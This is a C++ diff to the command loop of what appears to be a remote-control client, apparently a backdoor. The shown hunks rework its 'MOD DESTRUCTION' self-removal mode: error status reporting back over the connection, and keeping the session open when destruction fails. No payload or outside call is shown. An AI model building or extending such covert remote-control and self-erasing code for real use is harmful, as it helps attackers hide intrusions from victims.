@@ -60,7 +60,7 @@ int Connexion::main()
     
     int cmpt;
     const int max_cmpt = TIMEOUT / MICRO_SLEEP;
-    
+    bool status_destruction = false; //Test if error in Destruction
     while(true)
     {
         //Sleep(1000);
@@ -150,22 +150,26 @@ int Connexion::main()
                 string name_prog = NAME_PROG; //To change
                 wstring name_prog_unicode(name_prog.begin(), name_prog.end()) ; //To change
                 wstring path_prog_unicode(a_path_prog.begin(), a_path_prog.end());
+                
                 cout << "MOD DESTRUCTION !" << endl;
-                cout << command.substr(16,7) << endl;
+                
                 Destruction destruction(name_prog_unicode, path_prog_unicode);
 
-                if(destruction.main()) //Go destruction !
+                status_destruction = destruction.main();
+
+                if(status_destruction) //Go destruction !
                 {
                     //If error
                     //string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
-                    status = "MOD_DESTRUCTION:" SPLIT + (string)"1";// "[-] An error occurred while executing the destroy mode.";
+                    status = "MOD_DESTRUCTION:" SPLIT + (string)"True";// "[-] An error occurred while executing the destroy mode.";
                     cout << "statuts: " << status << endl;
                 }
                 else
                 {
-                    status = "MOD_DESTRUCTION:" SPLIT + (string)"0";//"[+] The destruction mode is executed successfully.";
+                    status = "MOD_DESTRUCTION:" SPLIT + (string)"False";//"[+] The destruction mode is executed successfully.";
                     cout << "statuts: " << status << endl;
                 }  
+
 
                 if(command.substr(16,7) == "default") //6 for default
                 {
@@ -181,10 +185,17 @@ int Connexion::main()
                     cout << "BROADCAST DESTRUCTION !!!!" << endl; 
                 }
                 
-                cout << "bye... " << endl;
-                system("pause");
-                closeConnexion();
-                exit(0);    
+                if(status_destruction) //If an error does not finish the connection.
+                {
+                    ;
+                }
+                else
+                {
+                    cout << "Not error bye... " << endl;
+                    system("pause");
+                    closeConnexion();
+                    exit(0);
+                }
             }
 
             else
